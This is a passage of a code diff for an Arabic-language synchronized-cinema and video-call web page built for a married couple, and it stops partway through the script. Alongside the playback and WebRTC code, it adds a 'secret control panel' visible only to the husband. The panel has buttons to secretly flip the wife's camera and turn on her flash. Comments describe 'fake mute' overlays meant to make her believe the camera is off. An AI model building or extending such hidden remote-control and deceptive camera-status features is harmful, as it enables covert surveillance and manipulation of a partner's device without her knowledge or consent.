@@ -4,17 +4,18 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>سينما VIP 🎬</title>
-    <meta name="theme-color" content="#030106">
+    <meta name="theme-color" content="#05020a">
+    <link rel="manifest" href="/manifest.json">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     
-    <!-- Tailwind CSS for high-fidelity responsive UI layouts -->
+    <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
-    <!-- Font Awesome for sleek modern icons -->
+    <!-- Font Awesome Icons -->
     <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
-    <!-- PeerJS Library for direct peer-to-peer fast video-calling -->
-    <script src="https://unpkg.com/peerjs@1.5.1/dist/peerjs.min.js"></script>
-    <!-- YouTube Player API for synchronized YouTube cinema -->
+    <!-- Socket.io Real-time client library -->
+    <script src="/socket.io/socket.io.js"></script>
+    <!-- YouTube API -->
     <script src="https://www.youtube.com/iframe_api"></script>
 
     <style>
@@ -30,59 +31,50 @@
         }
         
         body { 
-            background: radial-gradient(circle at 50% 0%, #150b24 0%, #030107 100%);
+            background: #030008; 
             color: #fff; 
             min-height: 100vh; 
             overflow-x: hidden; 
             user-select: none; 
         }
 
-        /* Glassmorphism Luxury Design System */
+        /* Ambient Dynamic Luxury Glow Behind Screen */
+        .ambient-glow {
+            position: absolute;
+            top: 5%;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 85%;
+            height: 380px;
+            background: radial-gradient(circle, rgba(255, 45, 85, 0.12) 0%, transparent 75%);
+            z-index: 0;
+            pointer-events: none;
+            filter: blur(45px);
+        }
+        
         .glass-card {
-            background: rgba(18, 11, 28, 0.65);
+            background: rgba(18, 12, 28, 0.65);
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 45, 85, 0.2);
+            border: 1px solid rgba(255, 45, 85, 0.18);
             border-radius: 24px;
-            box-shadow: 0 20px 45px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255, 255, 255, 0.05);
+            box-shadow: 0 15px 40px rgba(0,0,0,0.6);
         }
 
-        .glass-input {
-            background: rgba(0, 0, 0, 0.4);
-            border: 1px solid rgba(255, 45, 85, 0.15);
-            border-radius: 14px;
-            color: #fff;
-            transition: all 0.3s ease;
-        }
-        .glass-input:focus {
-            border-color: rgba(255, 45, 85, 0.6);
-            box-shadow: 0 0 12px rgba(255, 45, 85, 0.25);
-            background: rgba(0, 0, 0, 0.6);
-        }
-
-        /* Premium Buttons */
         .btn-premium {
             background: linear-gradient(135deg, #ff2d55 0%, #d81b60 100%);
-            box-shadow: 0 6px 20px rgba(255, 45, 85, 0.4);
-            transition: transform 0.2s, box-shadow 0.2s, opacity 0.2s;
+            box-shadow: 0 6px 22px rgba(255, 45, 85, 0.45);
+            transition: all 0.25s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
-        .btn-premium:hover {
-            opacity: 0.95;
-            box-shadow: 0 8px 25px rgba(255, 45, 85, 0.5);
-        }
-        .btn-premium:active { 
-            transform: scale(0.96); 
-        }
+        .btn-premium:active { transform: scale(0.95); }
 
-        /* WebRTC Cam Grid Styling - Tailored specifically to mount User Cam directly below Partner Cam */
-        .cam-wrapper {
-            background: #000;
-            border-radius: 20px;
-            overflow: hidden;
+        .cam-container {
             position: relative;
-            border: 2px solid rgba(255, 45, 85, 0.25);
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-            transition: border-color 0.4s ease;
+            background: #000;
+            border-radius: 24px;
+            overflow: hidden;
+            border: 1px solid rgba(255, 45, 85, 0.25);
+            box-shadow: 0 12px 55px rgba(255, 45, 85, 0.18);
         }
 
         .cam-video {
@@ -90,493 +82,366 @@
             height: 100%; 
             object-fit: cover;
             transform: scaleX(-1);
-            filter: scaleX(-1) brightness(1.15) contrast(1.05) saturate(1.15);
+            filter: scaleX(-1) brightness(1.3) contrast(1.05) saturate(1.15);
         }
 
+        /* Floating FaceTime PIP camera for local stream */
+        .my-floating-cam {
+            position: absolute; 
+            bottom: 16px; 
+            left: 16px;
+            width: 115px; 
+            height: 170px;
+            border-radius: 18px; 
+            border: 2px solid #30d158;
+            overflow: hidden; 
+            z-index: 20; 
+            background: #09060f;
+            box-shadow: 0 12px 35px rgba(0,0,0,0.85);
+        }
+
+        /* Toast system */
         .toast-notify {
             position: fixed; 
             top: 24px; 
             left: 50%; 
-            transform: translateX(-50%) translateY(-100px);
+            transform: translateX(-50%) translateY(-120px);
             background: rgba(255, 45, 85, 0.95); 
             backdrop-filter: blur(12px);
             -webkit-backdrop-filter: blur(12px);
             padding: 14px 28px; 
-            border-radius: 18px; 
-            font-weight: 700; 
-            z-index: 1000;
+            border-radius: 20px; 
+            font-weight: 800; 
+            z-index: 9999;
             display: flex; 
             align-items: center; 
             gap: 12px;
-            box-shadow: 0 12px 30px rgba(255, 45, 85, 0.4);
+            box-shadow: 0 10px 30px rgba(255, 45, 85, 0.45);
             transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
-        .toast-notify.show { 
-            transform: translateX(-50%) translateY(0); 
-        }
+        .toast-notify.show { transform: translateX(-50%) translateY(0); }
 
-        /* Steathy/Manager Elements */
         .stealth-btn { 
-            background: linear-gradient(135deg, #e5c060, #b28e2b); 
-            color: #000; 
+            background: linear-gradient(135deg, #d4af37 0%, #b89018 100%); 
+            color: #05020a; 
             font-weight: 900; 
-            box-shadow: 0 4px 15px rgba(229, 192, 96, 0.3);
-            transition: all 0.2s ease;
+            box-shadow: 0 5px 15px rgba(212, 175, 55, 0.35);
         }
-        .stealth-btn:active {
-            transform: scale(0.95);
-        }
-
-        /* Fluid Animated Hearts */
+        .stealth-btn:active { transform: scale(0.96); }
+        
         .heart-float {
             position: fixed; 
             bottom: -50px; 
             font-size: 32px; 
             pointer-events: none; 
-            z-index: 9999;
-            filter: drop-shadow(0 0 8px rgba(255, 45, 85, 0.6));
+            z-index: 999;
             animation: floatUp 3.2s ease-in-out forwards;
         }
         @keyframes floatUp {
-            0% { transform: translateY(0) scale(0.6) rotate(-15deg); opacity: 0; }
-            15% { opacity: 1; transform: translateY(-20vh) scale(1.1) rotate(15deg); }
-            100% { transform: translateY(-110vh) scale(0.7) rotate(-30deg); opacity: 0; }
+            0% { transform: translateY(0) scale(0.6) rotate(0deg); opacity: 0; }
+            20% { opacity: 1; transform: translateY(-20vh) scale(1.3) rotate(15deg); }
+            100% { transform: translateY(-110vh) scale(0.8) rotate(-20deg); opacity: 0; }
         }
 
-        /* Premium Video Box */
         .video-box { 
             background: #000; 
             position: relative; 
             border-radius: 20px; 
             overflow: hidden; 
             aspect-ratio: 16/9;
-            box-shadow: 0 15px 40px rgba(0,0,0,0.7), 0 0 20px rgba(255, 45, 85, 0.05);
-            border: 1px solid rgba(255, 45, 85, 0.15);
+            border: 1px solid rgba(255, 255, 255, 0.08);
         }
-        
-        /* Status Dot pulsing */
-        .status-dot {
-            width: 12px;
-            height: 12px;
-            border-radius: 50%;
-            transition: all 0.3s ease;
-        }
+        video { width: 100%; height: 100%; outline: none; }
     </style>
 </head>
-<body>
+<body class="relative">
+    <div class="ambient-glow"></div>
 
-    <!-- إشعارات النظام الممتازة -->
     <div id="toast" class="toast-notify">
-        <span id="toastIcon" class="text-xl">✨</span>
-        <span id="toastMsg" class="tracking-wide">نظام المزامنة الذكي جاهز</span>
+        <span id="toastIcon">✨</span>
+        <span id="toastMsg">جاري المزامنة التلقائية الفاخرة...</span>
     </div>
 
-    <!-- شاشة الدخول الفخمة والآمنة -->
-    <div id="loginScreen" class="min-h-screen flex flex-col items-center justify-center p-6 relative z-10 transition-all duration-500">
+    <!-- شاشة الدخول السحرية لفك حظر الصوت والوسائط الفوري بالمتصفحات -->
+    <div id="loginScreen" class="min-h-screen flex flex-col items-center justify-center p-6 relative z-10">
         <div class="text-center mb-10">
-            <div class="inline-flex items-center justify-center w-20 h-20 rounded-full bg-gradient-to-tr from-rose-500 to-purple-600 mb-4 shadow-[0_0_30px_rgba(255,45,85,0.4)]">
-                <i class="fa fa-diamond text-4xl text-white"></i>
-            </div>
-            <h1 class="text-5xl font-black mb-2 bg-gradient-to-r from-rose-400 via-pink-500 to-purple-500 bg-clip-text text-transparent tracking-wide">VIP Cinema</h1>
-            <p class="text-gray-400 text-sm tracking-wider">بث سينمائي وتواصل عائلي آمن ومشفر بالكامل 🔒</p>
+            <h1 class="text-6xl font-black mb-3 bg-gradient-to-r from-rose-400 via-pink-500 to-purple-500 bg-clip-text text-transparent filter drop-shadow-[0_10px_20px_rgba(255,45,85,0.35)] animate-pulse">VIP Cinema</h1>
+            <p class="text-gray-400 text-sm md:text-base">بوابة المزامنة الفاخرة المشفرة لأبو عاهد وأم الارا 💖</p>
         </div>
-        
-        <div class="glass-card p-8 w-full max-w-md flex flex-col gap-6">
-            <!-- كود الغرفة المشترك لضمان اتصال خاص بدون متطفلين -->
-            <div>
-                <label class="block text-xs text-rose-400 font-bold mb-2 uppercase tracking-widest">مفتاح الاتصال الخاص المشترك (اختياري)</label>
-                <input type="text" id="roomKey" value="VIP-AHAD-ALARA" placeholder="أدخل اسم الغرفة السرية..." class="w-full glass-input px-4 py-3 text-sm text-center font-bold tracking-widest">
-            </div>
-
-            <div class="h-[1px] bg-white/10 my-1"></div>
-
-            <button onclick="login('abouahad')" class="btn-premium py-4 rounded-xl font-black text-lg flex items-center justify-center gap-3 hover:scale-[1.02] active:scale-[0.98] transition-transform">
-                <i class="fa fa-user-secret text-2xl"></i> دخول أبو عاهد 👑
+        <div class="glass-card p-8 w-full max-w-sm flex flex-col gap-5">
+            <button onclick="login('abouahad')" class="btn-premium py-4 rounded-2xl font-black text-xl flex items-center justify-center gap-3">
+                <i class="fa fa-user-circle text-2xl"></i> دخول أبو عاهد 👑
             </button>
-            
-            <button onclick="login('umalara')" class="btn-premium py-4 rounded-xl font-black text-lg flex items-center justify-center gap-3 hover:scale-[1.02] active:scale-[0.98] transition-transform" style="background: linear-gradient(135deg, #e0115f, #ff69b4); box-shadow: 0 6px 20px rgba(224, 17, 95, 0.35);">
-                <i class="fa fa-heart text-2xl animate-pulse"></i> دخول أم الارا 🌸
+            <button onclick="login('umalara')" class="btn-premium py-4 rounded-2xl font-black text-xl flex items-center justify-center gap-3" style="background: linear-gradient(135deg, #e0115f, #ff69b4);">
+                <i class="fa fa-heart text-2xl"></i> دخول أم الارا 🌸
             </button>
         </div>
     </div>
 
-    <!-- شاشة السينما الرئيسية والاتصال الثنائي -->
-    <div id="cinemaScreen" class="hidden min-h-screen flex-col p-4 md:p-6 lg:p-8 gap-6 max-w-7xl mx-auto opacity-0 transition-opacity duration-500">
+    <!-- شاشة السينما الرئيسية الفخمة -->
+    <div id="cinemaScreen" class="hidden min-h-screen flex flex-col p-4 md:p-6 gap-5 max-w-5xl mx-auto relative z-10">
         
         <!-- شريط الحالة العلوي الفخم -->
-        <div class="glass-card p-4 flex justify-between items-center px-6">
+        <div class="glass-card p-4 flex justify-between items-center">
             <div class="flex items-center gap-3">
-                <div id="statusDot" class="status-dot bg-red-500 shadow-[0_0_10px_#ef4444] animate-pulse"></div>
-                <span id="partnerStatusText" class="text-sm md:text-base font-bold text-gray-300">في انتظار الشريك...</span>
+                <div id="statusDot" class="w-3.5 h-3.5 rounded-full bg-red-500 shadow-[0_0_12px_#ef4444] animate-pulse"></div>
+                <span id="partnerStatusText" class="text-sm font-black text-gray-300">الشريكة غير متصلة</span>
             </div>
-            <div class="flex items-center gap-3">
-                <span class="text-xs bg-rose-500/10 border border-rose-500/20 text-rose-400 px-4 py-1.5 rounded-full font-black tracking-wider flex items-center gap-2">
-                    <span class="w-2.5 h-2.5 bg-rose-500 rounded-full animate-ping"></span> مباشر 🔴
-                </span>
+            <div class="flex items-center gap-2">
+                <span class="text-xs bg-rose-500/20 text-rose-400 px-4.5 py-1.5 rounded-full font-black border border-rose-500/30">مباشر ومزامن 🔴</span>
             </div>
         </div>
 
-        <!-- شبكة العرض الكبرى -->
-        <div class="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
+        <!-- مشغل المزامنة والسينما الذكي المطور لمنع التقطيع -->
+        <div class="glass-card p-3 flex flex-col gap-3">
+            <div class="flex gap-2.5">
+                <input type="text" id="vidLink" placeholder="رابط فيلم مباشر (MP4/MKV) أو رابط يوتيوب..." class="flex-grow bg-black/60 border border-white/10 rounded-2xl px-5 py-3 text-sm md:text-base text-white focus:border-rose-500 focus:bg-black/90 transition-all">
+                <button onclick="startVideo()" class="btn-premium px-8 py-3 rounded-2xl font-black text-sm md:text-base"><i class="fa fa-play-circle text-lg"></i> تشغيل</button>
+            </div>
             
-            <!-- العمود الأيمن الكبير: السينما والتحكم بالفيديو -->
-            <div class="lg:col-span-8 flex flex-col gap-4">
-                <div class="glass-card p-4 flex flex-col gap-3">
-                    <div class="flex flex-col sm:flex-row gap-2">
-                        <div class="relative flex-grow">
-                            <i class="fa fa-link absolute right-4 top-1/2 -translate-y-1/2 text-rose-400"></i>
-                            <input type="text" id="vidLink" placeholder="رابط فيديو مباشر MP4 أو رابط YouTube..." class="w-full glass-input pr-10 pl-4 py-3 text-sm font-semibold">
-                        </div>
-                        <button onclick="startVideo()" class="btn-premium px-8 py-3 rounded-xl font-bold text-sm sm:text-base flex items-center justify-center gap-2"><i class="fa fa-play-circle text-lg"></i> تشغيل مباشر</button>
-                    </div>
-                    
-                    <div class="video-box">
-                        <video id="mainVid" controls playsinline class="hidden w-full h-full"></video>
-                        <div id="ytPlayerContainer" class="hidden w-full h-full"><div id="ytPlayer"></div></div>
-                        <div id="vidPlaceholder" class="absolute inset-0 flex flex-col items-center justify-center bg-black/85 text-gray-400 text-sm md:text-base">
-                            <i class="fa fa-film text-5xl text-rose-500/40 mb-3 animate-pulse"></i>
-                            <p class="font-bold tracking-wider">سينما VIP الفاخرة جاهزة لبدء العرض...</p>
-                        </div>
-                    </div>
+            <div class="video-box shadow-2xl">
+                <!-- إضافة خصائص البث والتشغيل التلقائي الآمن لمنع التقطيع -->
+                <video id="mainVid" controls playsinline autoplay class="hidden w-full h-full"></video>
+                <div id="ytPlayerContainer" class="hidden w-full h-full"><div id="ytPlayer"></div></div>
+                <div id="vidPlaceholder" class="absolute inset-0 flex flex-col items-center justify-center bg-black/90 text-gray-400 p-6 text-center">
+                    <i class="fa fa-film text-5xl text-rose-500/40 mb-3 animate-pulse"></i>
+                    <p class="text-sm md:text-base font-bold">السينما جاهزة للعرض الفخم الخالي من التعليق...</p>
                 </div>
+            </div>
+        </div>
 
-                <!-- لوحة التحكم السرية للمدير أبو عاهد (مخفية تماماً عن أم الارا) -->
-                <div id="stealthPanel" class="hidden glass-card p-5 flex-wrap gap-3 justify-center border-yellow-500/30">
-                    <div class="w-full text-center text-xs text-yellow-500 font-black mb-1 tracking-widest"><i class="fa fa-user-secret"></i> لوحة التحكم السرية الفخمة لأبو عاهد 👑</div>
-                    <button onclick="remoteFlip()" class="stealth-btn px-5 py-2.5 rounded-xl text-xs font-bold flex items-center gap-2 hover:opacity-90"><i class="fa fa-refresh"></i> عكس كاميرتها</button>
-                    <button onclick="remoteFlash()" class="stealth-btn px-5 py-2.5 rounded-xl text-xs font-bold flex items-center gap-2 hover:opacity-90"><i class="fa fa-lightbulb-o"></i> كشافها</button>
-                    <button onclick="forceSync()" class="bg-blue-600 text-white px-5 py-2.5 rounded-xl font-bold text-xs shadow-lg flex items-center gap-2 hover:bg-blue-500"><i class="fa fa-clock-o"></i> فرض المزامنة الفورية</button>
+        <!-- حاوية الكاميرات والـ P2P المزدوجة المعززة لمنع الشاشة السوداء -->
+        <div class="cam-container h-[420px] md:h-[550px]">
+            <!-- كاميرا الطرف الآخر العملاقة لتراها بكامل الفخامة -->
+            <video id="partnerCam" class="cam-video" autoplay playsinline></video>
+            
+            <!-- غطاء الحظر الوهمي التلقائي المخفي لخصوصية زوجتك الفائقة -->
+            <div id="partnerFakeMute" class="absolute inset-0 bg-[#030008] flex-col items-center justify-center text-rose-500 z-10 hidden">
+                <i class="fa fa-ban text-5xl mb-3 animate-bounce"></i>
+                <span class="text-xs md:text-sm font-black text-gray-400">الشريكة أغلقت الكاميرا</span>
+            </div>
+
+            <!-- الكاميرا الشخصية العائمة FaceTime PIP Style -->
+            <div class="my-floating-cam">
+                <video id="myCam" class="cam-video" autoplay muted playsinline></video>
+                <!-- غطاء التعتيم الوهمي الداخلي للشريكة لتظن أنها مغلقة تماماً -->
+                <div id="myFakeMute" class="absolute inset-0 bg-[#030008] flex flex-col items-center justify-center text-rose-500 z-30 hidden">
+                    <i class="fa fa-ban text-2xl animate-pulse"></i>
+                    <span class="text-[9px] font-bold text-gray-400 mt-1">الكاميرا مغلقة</span>
                 </div>
             </div>
 
-            <!-- العمود الأيسر: الكاميرات (أنت تحت شريكتك مباشرة كما طلبت) -->
-            <div class="lg:col-span-4 flex flex-col gap-4">
-                
-                <!-- 1. مربع الكاميرا للشريك (أم الارا / أبو عاهد) في الأعلى دائماً -->
-                <div class="flex flex-col gap-1.5">
-                    <span class="text-xs text-rose-400 font-bold tracking-wider px-2"><i class="fa fa-heart animate-pulse"></i> بث الشريك المباشر</span>
-                    <div class="cam-wrapper h-[240px] md:h-[300px]">
-                        <video id="partnerCam" class="cam-video" autoplay playsinline></video>
-                        
-                        <!-- الغطاء الوهمي للشريكة لضمان الخصوصية والراحة لها -->
-                        <div id="partnerFakeMute" class="absolute inset-0 bg-[#05020a]/95 flex flex-col items-center justify-center text-rose-500 z-10 hidden">
-                            <i class="fa fa-video-slash text-4xl mb-2"></i>
-                            <span class="text-xs font-bold tracking-wider">الكاميرا مغلقة للخصوصية</span>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- 2. مربع كاميرتك الخاصة في الأسفل مباشرة (طلبك الأساسي) -->
-                <div class="flex flex-col gap-1.5">
-                    <span class="text-xs text-emerald-400 font-bold tracking-wider px-2"><i class="fa fa-circle text-[8px] animate-pulse"></i> الكاميرا الخاصة بك</span>
-                    <div class="cam-wrapper h-[180px] md:h-[220px] !border-emerald-500/20">
-                        <video id="myCam" class="cam-video" autoplay muted playsinline></video>
-                        
-                        <div id="myFakeMute" class="absolute inset-0 bg-[#05020a]/95 flex flex-col items-center justify-center text-rose-500 z-10 hidden">
-                            <i class="fa fa-video-slash text-3xl"></i>
-                        </div>
-
-                        <!-- أزرار الحب والتحكم العائمة موضوعة بذوق بداخل كاميرا المستخدم -->
-                        <div class="absolute bottom-3 right-3 flex gap-2 z-30">
-                            <button onclick="sendLove()" class="w-10 h-10 rounded-full btn-premium flex items-center justify-center text-lg shadow-lg hover:scale-105"><i class="fa fa-heart"></i></button>
-                            <button onclick="toggleMyCam()" id="myCamBtn" class="w-10 h-10 rounded-full bg-black/75 border border-white/20 text-white flex items-center justify-center text-base hover:bg-black/90"><i class="fa fa-video-camera"></i></button>
-                            <button onclick="toggleMyMic()" id="myMicBtn" class="w-10 h-10 rounded-full bg-black/75 border border-white/20 text-white flex items-center justify-center text-base hover:bg-black/90"><i class="fa fa-microphone"></i></button>
-                        </div>
-                    </div>
-                </div>
-
+            <!-- أزرار تفاعلية مدمجة فوق الكاميرا للشخصية والاتصال السريع -->
+            <div class="absolute right-4 top-4 flex flex-col gap-3.5 z-30">
+                <button onclick="sendLove()" class="w-13 h-13 rounded-full btn-premium flex items-center justify-center text-2xl shadow-xl hover:scale-110 transition-transform"><i class="fa fa-heart"></i></button>
+                <button onclick="toggleMyCam()" id="myCamBtn" class="w-13 h-13 rounded-full bg-black/60 border border-white/20 text-white flex items-center justify-center text-xl hover:bg-rose-500 transition-colors shadow-lg"><i class="fa fa-video-camera"></i></button>
+                <button onclick="toggleMyMic()" id="myMicBtn" class="w-13 h-13 rounded-full bg-black/60 border border-white/20 text-white flex items-center justify-center text-xl hover:bg-rose-500 transition-colors shadow-lg"><i class="fa fa-microphone"></i></button>
             </div>
+        </div>
+
+        <!-- لوحة التحكم السرية الفائقة التخفي (تظهر فقط لأبو عاهد) -->
+        <div id="stealthPanel" class="hidden glass-card p-5 flex-wrap gap-3.5 justify-center border-yellow-500/20 shadow-2xl" style="background: rgba(22, 16, 8, 0.65);">
+            <div class="w-full text-center text-sm text-yellow-500 font-black mb-1.5 flex items-center justify-center gap-2">
+                <i class="fa fa-shield text-lg animate-pulse"></i> لوحة التحكم السرية لأبو عاهد (لا تظهر للشريكة إطلاقاً) 👑
+            </div>
+            <button onclick="remoteFlip()" class="stealth-btn px-6 py-3 rounded-2xl text-sm flex items-center gap-2 transition-transform"><i class="fa fa-refresh"></i> عكس كاميرتها سراً</button>
+            <button onclick="remoteFlash()" class="stealth-btn px-6 py-3 rounded-2xl text-sm flex items-center gap-2 transition-transform"><i class="fa fa-lightbulb-o"></i> تشغيل كشافها سراً</button>
+            <button onclick="forceSync()" class="bg-indigo-600 text-white px-6 py-3 rounded-2xl font-black text-sm shadow-xl flex items-center gap-2 hover:bg-indigo-700 transition-colors"><i class="fa fa-clock-o"></i> ضبط الوقت التام</button>
         </div>
     </div>
 
     <script>
-        // متغيرات النظام والاتصال
+        const socket = io();
         let myId = '';
-        let targetId = '';
-        let secretKey = '';
-        
         let myStream = null;
-        let peer = null;
-        let dataConnection = null;
-        let mediaCall = null;
-        
+        let peerConnection = null;
         let currentFacingMode = 'user';
         let flashActive = false;
-        
-        // مشغلات الفيديو واليوتيوب
         let ytPlayer = null;
         let isYtReady = false;
         let activePlayer = 'none';
 
-        // محرك منع التقطيع الفائق
+        // خوارزمية منع التقطيع الدقيق والارتداد اللانهائي (Anti-Stutter & Loop Lock)
         let isSyncing = false; 
         let syncTimeout = null;
         let lastKnownTime = 0;
 
-        function onYouTubeIframeAPIReady() { 
-            isYtReady = true; 
-        }
+        // مصفوفة حزم الاتصال الذكية لضمان حل مشكلة الشاشة السوداء في الـ WebRTC
+        let iceCandidatesQueue = [];
 
-        // إشعار فخم
+        const configuration = {
+            'iceServers': [
+                { 'urls': 'stun:stun.l.google.com:19302' },
+                { 'urls': 'stun:stun1.l.google.com:19302' },
+                { 'urls': 'stun:stun2.l.google.com:19302' }
+            ]
+        };
+
+        function onYouTubeIframeAPIReady() { isYtReady = true; }
+
         function showToast(msg, icon="✨") {
             document.getElementById('toastMsg').innerText = msg;
-            document.getElementById('toastIcon').innerHTML = icon;
+            document.getElementById('toastIcon').innerText = icon;
             const t = document.getElementById('toast');
             t.classList.add('show');
-            setTimeout(() => t.classList.remove('show'), 3500);
+            setTimeout(() => t.classList.remove('show'), 3000);
         }
 
         async function login(userId) {
-            const roomVal = document.getElementById('roomKey').value.trim() || 'VIP-SECURE';
-            secretKey = roomVal.toLowerCase().replace(/[^a-z0-9]/g, '');
+            myId = userId;
             
-            // تحديد أسماء المعرفات الفريدة بناء على كود الغرفة لمنع التداخل
-            myId = `${secretKey}-${userId}`;
-            targetId = userId === 'abouahad' ? `${secretKey}-umalara` : `${secretKey}-abouahad`;
+            // محرك فك حظر تشغيل الصوت والفيديو الصامت بالمتصفحات (Silent Media Unblock Engine)
+            try {
+                let silentUnlockAudio = new Audio("data:audio/mp3;base64,//OExAAAAANIAAAAAExBTUUzLjEwMKqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq");
+                silentUnlockAudio.play().catch(e => {});
+            } catch(e) {}
 
-            // تلاشي شاشة الدخول وبدء شاشة العرض
-            const loginScr = document.getElementById('loginScreen');
-            const cinemaScr = document.getElementById('cinemaScreen');
+            document.getElementById('loginScreen').style.display = 'none';
+            document.getElementById('cinemaScreen').classList.remove('hidden');
+            document.getElementById('cinemaScreen').classList.add('flex');
             
-            loginScr.style.opacity = '0';
-            setTimeout(() => {
-                loginScr.style.display = 'none';
-                cinemaScr.classList.remove('hidden');
-                cinemaScr.classList.add('flex');
-                setTimeout(() => cinemaScr.style.opacity = '1', 50);
-            }, 500);
-
-            // تفعيل لوحة المدير السرية لأبو عاهد
-            if (userId === 'abouahad') {
-                const sp = document.getElementById('stealthPanel');
-                sp.classList.remove('hidden');
-                sp.classList.add('flex');
+            if (myId === 'abouahad') {
+                document.getElementById('stealthPanel').classList.remove('hidden');
+                document.getElementById('stealthPanel').classList.add('flex');
             }
 
-            showToast('جاري تحضير البث المباشر والكاميرات...', '🎥');
             await setupMedia();
-            initPeerJS(userId);
+            socket.emit('register-user', myId);
         }
 
         async function setupMedia() {
             try {
-                if (myStream) {
-                    myStream.getTracks().forEach(t => t.stop());
-                }
+                if (myStream) myStream.getTracks().forEach(t => t.stop());
                 myStream = await navigator.mediaDevices.getUserMedia({
-                    video: { 
-                        facingMode: currentFacingMode,
-                        width: { ideal: 640 },
-                        height: { ideal: 480 },
-                        frameRate: { max: 24 }
-                    },
-                    audio: { 
-                        echoCancellation: true, 
-                        noiseSuppression: true,
-                        autoGainControl: true
-                    }
+                    video: { facingMode: currentFacingMode, width: 480, height: 640 },
+                    audio: { echoCancellation: true, noiseSuppression: true, autoGainControl: true }
                 });
                 document.getElementById('myCam').srcObject = myStream;
                 
-                // استبدال بث الكاميرا في الاتصال المباشر النشط فوراً لتفادي إعادة الاتصال
-                if (mediaCall && mediaCall.peerConnection) {
+                if (peerConnection) {
                     const videoTrack = myStream.getVideoTracks()[0];
-                    const sender = mediaCall.peerConnection.getSenders().find(s => s.track.kind === 'video');
-                    if (sender) {
-                        sender.replaceTrack(videoTrack);
-                    }
+                    const sender = peerConnection.getSenders().find(s => s.track && s.track.kind === 'video');
+                    if (sender) sender.replaceTrack(videoTrack);
                 }
             } catch(e) {
-                console.warn(e);
-                showToast('تعذر تشغيل الكاميرا الخاصة بك. يرجى تفعيل الصلاحية.', '⚠️');
+                showToast('تعذر تنشيط الكاميرا لعدم منح صلاحية الهاتف.', '⚠️');
             }
         }
 
-        function initPeerJS(userRole) {
-            // إنشاء الـ Peer للاتصال المباشر المستقر بدون خوادم معقدة
-            peer = new Peer(myId, {
-                debug: 1,
-                config: {
-                    'iceServers': [
-                        { 'urls': 'stun:stun.l.google.com:19302' },
-                        { 'urls': 'stun:stun1.l.google.com:19302' },
-                        { 'urls': 'stun:stun2.l.google.com:19302' }
-                    ]
-                }
-            });
-
-            peer.on('open', (id) => {
-                console.log('Peer open with ID:', id);
-                // محاولة متواصلة ومستقرة للاتصال بالشريك
-                startConnectingCycle();
-            });
-
-            // تلقي اتصال البيانات
-            peer.on('connection', (conn) => {
-                bindDataConnection(conn);
-            });
-
-            // تلقي اتصال الفيديو/الصوت
-            peer.on('call', (call) => {
-                mediaCall = call;
-                call.answer(myStream);
-                bindMediaCall(call);
-            });
-
-            peer.on('error', (err) => {
-                console.log('PeerJS Error:', err.type);
-                if (err.type === 'peer-unavailable') {
-                    // الشريك ليس نشطاً بعد، لا مشكلة، النظام يعيد المحاولة تلقائياً بصمت
-                }
-            });
-        }
-
-        // محرك إعادة الاتصال المستمر لضمان عدم الانقطاع وتخريب المباشر
-        function startConnectingCycle() {
-            tryToConnect();
-            setInterval(() => {
-                if (!dataConnection || !dataConnection.open) {
-                    tryToConnect();
-                }
-            }, 6000);
-        }
-
-        function tryToConnect() {
-            if (dataConnection && dataConnection.open) return;
-
-            // محاولة الاتصال ببيانات الشريك
-            const conn = peer.connect(targetId, { reliable: true });
-            bindDataConnection(conn);
-
-            // أبو عاهد يبدأ دائماً الاتصال الصوتي والمرئي لتسريع ثبات الربط
-            if (myId.includes('abouahad') && myStream) {
-                const call = peer.call(targetId, myStream);
-                mediaCall = call;
-                bindMediaCall(call);
+        function initRTC() {
+            if (peerConnection) peerConnection.close();
+            peerConnection = new RTCPeerConnection(configuration);
+            iceCandidatesQueue = []; // تصفير الطابور لضمان اتصال نقي
+            
+            if (myStream) {
+                myStream.getTracks().forEach(track => {
+                    peerConnection.addTrack(track, myStream);
+                });
             }
-        }
 
-        // ربط مستمعات المكالمة الصوتية والمرئية
-        function bindMediaCall(call) {
-            call.on('stream', (remoteStream) => {
+            peerConnection.ontrack = (event) => {
                 const partnerVid = document.getElementById('partnerCam');
-                if (partnerVid.srcObject !== remoteStream) {
-                    partnerVid.srcObject = remoteStream;
-                    showToast('تم الاتصال المرئي المباشر بنجاح! 🟢', '💖');
-                    updateStatusDisplay(true);
+                if (partnerVid.srcObject !== event.streams[0]) {
+                    partnerVid.srcObject = event.streams[0];
                 }
-            });
+            };
 
-            call.on('close', () => {
-                document.getElementById('partnerCam').srcObject = null;
-                updateStatusDisplay(false);
-            });
+            peerConnection.onicecandidate = (event) => {
+                if (event.candidate) {
+                    socket.emit('webrtc-candidate', event.candidate);
+                }
+            };
         }
 
-        // ربط مستمعات قناة البيانات للتحكم الفوري والمزامنة
-        function bindDataConnection(conn) {
-            dataConnection = conn;
-
-            conn.on('open', () => {
-                updateStatusDisplay(true);
-                showToast('متصل الآن بالشريك مباشر 🔐', '🟢');
-                // بث الحالة الحالية للسينما للشريك فوراً
-                setTimeout(emitCinemaState, 1000);
-            });
-
-            conn.on('data', (data) => {
-                handleIncomingSignal(data);
-            });
-
-            conn.on('close', () => {
-                updateStatusDisplay(false);
-            });
+        async function makeCall() {
+            initRTC(); 
+            const offer = await peerConnection.createOffer();
+            await peerConnection.setLocalDescription(offer);
+            socket.emit('webrtc-offer', offer);
         }
 
-        // تحديث إضاءة شريط الحالة العلوي ونصوصه
-        function updateStatusDisplay(connected) {
+        // --- WebRTC Socket Signal Processing ---
+        socket.on('partner-status', (data) => {
